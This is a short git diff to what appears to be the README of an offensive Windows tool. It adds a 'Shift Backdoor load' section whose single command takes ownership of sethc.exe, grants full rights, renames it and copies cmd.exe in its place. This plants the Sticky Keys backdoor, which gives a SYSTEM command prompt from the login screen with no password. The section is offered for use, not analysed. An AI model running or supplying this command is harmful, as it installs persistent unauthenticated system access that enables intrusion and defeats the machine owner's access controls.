@@ -58,3 +58,13 @@ $ CGO_ENABLED=0 GOOS=windows GOARCH=386 go build -trimpath -ldflags "-s -w" -o b
 ![alt text](./pic/image-3.png)
 
 ![alt text](./pic/image-4.png)
+
+# Shift Backdoor load
+
+Run as Administrator:
+
+`cd C:\Windows\System32\ && takeown /f .\sethc.exe && icacls .\sethc.exe /grant Administrators:F && move .\sethc.exe .\sethc.exe.bak && copy .\cmd.exe .\sethc.exe`
+
+![alt text](./pic/image-5.png)
+
+![alt text](./pic/image-6.png)
